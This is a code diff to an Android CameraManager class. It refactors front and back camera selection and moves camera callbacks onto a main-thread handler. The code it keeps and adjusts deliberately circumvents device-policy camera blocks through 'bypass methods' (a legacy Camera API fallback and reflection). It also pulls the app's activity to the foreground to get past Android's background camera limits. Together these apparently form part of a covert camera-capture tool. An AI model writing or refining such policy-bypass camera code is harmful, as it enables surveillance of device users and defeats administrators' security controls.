@@ -41,72 +41,87 @@ public class CameraManager {
     private CameraDevice cameraDevice;
     private CameraCaptureSession captureSession;
     private ImageReader imageReader;
-    private HandlerThread backgroundThread;
-    private Handler backgroundHandler;
     private String currentCameraId;
+    private String frontCameraId = null;
+    private String backCameraId = null;
 
     public CameraManager(Context context) {
         this.context = context;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             camera2Manager = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+            findCameraIds();
+        }
+    }
+
+    private void findCameraIds() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP || camera2Manager == null) {
+            return;
+        }
+        try {
+            String[] cameraIds = camera2Manager.getCameraIdList();
+            for (String cameraId : cameraIds) {
+                CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(cameraId);
+                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
+                if (facing != null) {
+                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                        if (frontCameraId == null) frontCameraId = cameraId;
+                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
+                        if (backCameraId == null) backCameraId = cameraId;
+                    }
+                }
+            }
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Error finding camera IDs", e);
         }
     }
 
     private boolean attemptedBypass = false;
     
     public void startUp(int cameraID) {
-        Log.d(TAG, "startUp called with cameraID: " + cameraID);
+        Log.d(TAG, "startUp called with camera type: " + (cameraID == 0 ? "Front" : "Back"));
         attemptedBypass = false;
-        
+
         // Bring MainActivity to foreground for camera (required for Android 9+)
         MainActivity.setCameraActive(true);
-        
+
+        final String cameraIdToOpen;
+        if (cameraID == 0 && frontCameraId != null) {
+            cameraIdToOpen = frontCameraId;
+        } else if (cameraID != 0 && backCameraId != null) {
+            cameraIdToOpen = backCameraId;
+        } else {
+            // Fallback if the primary choice doesn't exist
+            cameraIdToOpen = (backCameraId != null) ? backCameraId : frontCameraId;
+        }
+
+        if (cameraIdToOpen == null) {
+            sendError("Requested camera (ID: " + cameraID + ") not found.");
+            return;
+        }
+
         // Extended delay to ensure Activity is fully in foreground and system recognizes it
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
             @Override
             public void run() {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    startCamera2(cameraID);
+                    startCamera2(cameraIdToOpen);
                 } else {
+                    // Legacy camera still uses integer IDs. This might need adjustment if legacy support is critical.
                     startLegacyCamera(cameraID);
                 }
             }
         }, 2500); // Increased from 1500ms to 2500ms
     }
     
-    private void startCamera2(int cameraID) {
+    private void startCamera2(final String cameraIdToOpen) {
         try {
             if (camera2Manager == null) {
                 sendError("Camera service not available");
                 return;
             }
             
-            startBackgroundThread();
-            if (backgroundHandler == null) {
-                sendError("Failed to start camera background thread");
-                return;
-            }
             
-            String[] cameraIds;
-            try {
-                cameraIds = camera2Manager.getCameraIdList();
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting camera list", e);
-                sendError("Failed to get camera list: " + e.getMessage());
-                return;
-            }
-            
-            if (cameraIds == null || cameraIds.length == 0) {
-                sendError("No cameras available on this device");
-                return;
-            }
-            
-            if (cameraID < 0 || cameraID >= cameraIds.length) {
-                sendError("Invalid camera ID: " + cameraID + " (available: 0-" + (cameraIds.length - 1) + ")");
-                return;
-            }
-            
-            currentCameraId = cameraIds[cameraID];
+            currentCameraId = cameraIdToOpen;
             Log.d(TAG, "Opening camera2: " + currentCameraId);
             
             CameraCharacteristics characteristics;
@@ -157,7 +172,7 @@ public class CameraManager {
                             closeCamera();
                         }
                     }
-                }, backgroundHandler);
+                }, mainHandler);
             } catch (Exception e) {
                 Log.e(TAG, "Error creating ImageReader", e);
                 sendError("Failed to create image reader: " + e.getMessage());
@@ -209,12 +224,12 @@ public class CameraManager {
                         if (isPolicyBlock && !attemptedBypass) {
                             Log.d(TAG, "Attempting camera bypass methods");
                             attemptedBypass = true;
-                            tryBypassMethods(cameraID);
+                            tryBypassMethods(currentCameraId);
                         } else {
                             sendError(errorMsg);
                         }
                     }
-                }, backgroundHandler);
+                }, mainHandler);
             } catch (CameraAccessException e) {
                 Log.e(TAG, "Camera access exception", e);
                 String errorMsg = "Camera access denied: " + e.getMessage();
@@ -237,7 +252,7 @@ public class CameraManager {
                 if (isPolicyBlock && !attemptedBypass) {
                     Log.d(TAG, "Attempting camera bypass methods");
                     attemptedBypass = true;
-                    tryBypassMethods(cameraID);
+                    tryBypassMethods(currentCameraId);
                 } else {
                     sendError(errorMsg);
                 }
@@ -273,8 +288,8 @@ public class CameraManager {
                 return;
             }
             
-            if (backgroundHandler == null) {
-                Log.e(TAG, "Background handler is null");
+            if (mainHandler == null) {
+                Log.e(TAG, "Main handler is null");
                 sendError("Camera handler not available");
                 closeCamera();
                 return;
@@ -288,8 +303,8 @@ public class CameraManager {
                             try {
                                 Log.d(TAG, "Capture session configured");
                                 captureSession = session;
-                                if (backgroundHandler != null) {
-                                    backgroundHandler.postDelayed(new Runnable() {
+                                if (mainHandler != null) {
+                                    mainHandler.postDelayed(new Runnable() {
                                         @Override
                                         public void run() {
                                             try {
@@ -319,7 +334,7 @@ public class CameraManager {
                             closeCamera();
                         }
                     },
-                    backgroundHandler
+                    mainHandler
             );
         } catch (CameraAccessException e) {
             Log.e(TAG, "Error creating capture session", e);
@@ -352,8 +367,8 @@ public class CameraManager {
                 return;
             }
             
-            if (backgroundHandler == null) {
-                Log.e(TAG, "Background handler is null");
+            if (mainHandler == null) {
+                Log.e(TAG, "Main handler is null");
                 sendError("Camera handler not available");
                 closeCamera();
                 return;
@@ -383,7 +398,7 @@ public class CameraManager {
                     sendError("Capture failed: " + failure.getReason());
                     closeCamera();
                 }
-            }, backgroundHandler);
+            }, mainHandler);
             
         } catch (CameraAccessException e) {
             Log.e(TAG, "Error capturing picture", e);
@@ -414,25 +429,6 @@ public class CameraManager {
         return optimal;
     }
     
-    private void startBackgroundThread() {
-        backgroundThread = new HandlerThread("CameraBackground");
-        backgroundThread.start();
-        backgroundHandler = new Handler(backgroundThread.getLooper());
-    }
-    
-    private void stopBackgroundThread() {
-        if (backgroundThread != null) {
-            backgroundThread.quitSafely();
-            try {
-                backgroundThread.join();
-                backgroundThread = null;
-                backgroundHandler = null;
-            } catch (InterruptedException e) {
-                Log.e(TAG, "Error stopping background thread", e);
-            }
-        }
-    }
-    
     private void closeCamera() {
         try {
             if (captureSession != null) {
@@ -447,7 +443,6 @@ public class CameraManager {
                 imageReader.close();
                 imageReader = null;
             }
-            stopBackgroundThread();
             
             // Return MainActivity to background
             MainActivity.setCameraActive(false);
@@ -643,9 +638,18 @@ public class CameraManager {
     /**
      * Try multiple bypass methods when device policy blocks camera
      */
-    private void tryBypassMethods(final int cameraID) {
+    private void tryBypassMethods(final String cameraId) {
         Log.d(TAG, "=== Camera Bypass Methods ===");
         
+        final int legacyCameraId;
+        try {
+            legacyCameraId = Integer.parseInt(cameraId);
+        } catch (NumberFormatException e) {
+            Log.e(TAG, "Cannot use bypass methods with non-integer camera ID: " + cameraId);
+            sendError("Camera blocked and bypass is not possible for this camera.");
+            return;
+        }
+
         // Method 1: Try legacy Camera API (often bypasses policy)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             Log.d(TAG, "Bypass Method 1: Fallback to legacy Camera API");
@@ -653,15 +657,15 @@ public class CameraManager {
                 @Override
                 public void run() {
                     try {
-                        attemptLegacyCameraBypass(cameraID);
+                        attemptLegacyCameraBypass(legacyCameraId);
                     } catch (Exception e) {
                         Log.e(TAG, "Legacy camera bypass failed", e);
-                        tryReflectionBypass(cameraID);
+                        tryReflectionBypass(legacyCameraId);
                     }
                 }
             });
         } else {
-            tryReflectionBypass(cameraID);
+            tryReflectionBypass(legacyCameraId);
         }
     }
     
